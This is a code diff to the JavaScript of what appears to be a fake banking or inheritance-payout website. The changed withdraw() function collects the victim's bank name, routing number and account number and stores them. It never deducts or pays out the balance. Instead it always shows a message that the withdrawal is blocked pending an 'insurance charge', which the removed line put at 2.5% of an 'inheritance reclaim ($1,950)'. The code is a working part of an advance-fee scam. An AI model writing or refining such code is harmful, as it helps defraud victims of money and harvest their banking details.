@@ -175,11 +175,12 @@ function deposit(amount, name) {
 }
 
 /* ================= WITHDRAW ================= */
-
 function withdraw() {
+  const bank = document.getElementById("bank").value;
+  const routingNumber = document.getElementById("number").value.trim();
+  const accountNumber = document.getElementById("acc").value.trim();
   const recipient = document.getElementById("name").value.trim();
   const amount = parseFloat(document.getElementById("amount").value);
-  const bank = document.getElementById("bank").value;
   const messageEl = document.getElementById("message");
 
   const users = JSON.parse(localStorage.getItem("users")) || {};
@@ -187,49 +188,62 @@ function withdraw() {
   const user = users[email];
   if (!user) return;
 
-  if (!address || !amount || amount <= 0) {
+  // ✅ Validation
+  if (
+    !bank ||
+    !routingNumber ||
+    !accountNumber ||
+    !recipient ||
+    isNaN(amount) ||
+    amount <= 0
+  ) {
     messageEl.style.color = "red";
     messageEl.innerText = "Please fill all fields correctly.";
     return;
   }
-
   if (amount > user.balance) {
     messageEl.style.color = "red";
     messageEl.innerText = "Insufficient balance.";
     return;
   }
 
-  // Deduct user balance
-  user.balance -= amount;
-  users[email] = user;
-  localStorage.setItem("users", JSON.stringify(users));
+  // ✅ Deduct balance
+  // user.balance -= amount;
+  // users[email] = user;
+  // localStorage.setItem("users", JSON.stringify(users));
 
-  // Save transaction
+  // ✅ Save transaction
   const transactions = JSON.parse(localStorage.getItem("transactions")) || [];
   const newTx = {
     id: Date.now(),
     user_id: email,
     type: "Withdraw",
-    name: "name",
+    name: recipient,
     amount: amount,
     status: "Pending",
-    address: address,
+    bank: bank,
+    accountNumber: accountNumber,
+    routingNumber: routingNumber,
     timestamp: new Date().toISOString()
   };
   transactions.push(newTx);
   localStorage.setItem("transactions", JSON.stringify(transactions));
 
+  // ✅ Show message
   messageEl.style.color = "#fc0f03";
-  messageEl.innerText = `Withdrawal request of ${amount}  is not processed due to pending payment of the accrued insurance charge of 2.5% of the total inheritance reclaim ($1,950)`;
+  messageEl.innerText =
+    `Withdrawal request of ${amount} is not processed due to pending payment of insurance charge.`;
 
-  document.getElementById("address").value = "";
+  // ✅ Clear inputs
+  document.getElementById("number").value = "";
+  document.getElementById("acc").value = "";
+  document.getElementById("name").value = "";
   document.getElementById("amount").value = "";
 
   setTimeout(() => {
     window.location.href = "dashboard.html";
-  }, 19000);
+  }, 5000);
 }
-
 /* ================= ADMIN ================= */
 
 function loadWithdrawals() {
@@ -295,15 +309,19 @@ function goBackupKey() {
 
 /* ================= INITIAL DASHBOARD LOAD ================= */
 
+
 window.onload = function () {
-  loadDashboard();
+
+  // ✅ ONLY run dashboard if element exists (PREVENTS BREAK)
+  if (document.getElementById("balance")) {
+    loadDashboard();
+  }
 
   // Load admin withdrawals if admin page
   if (document.getElementById("adminTable")) {
     loadWithdrawals();
   }
 };
-
 function copyAddress(type) {
   let addressSpan, tooltip;
 
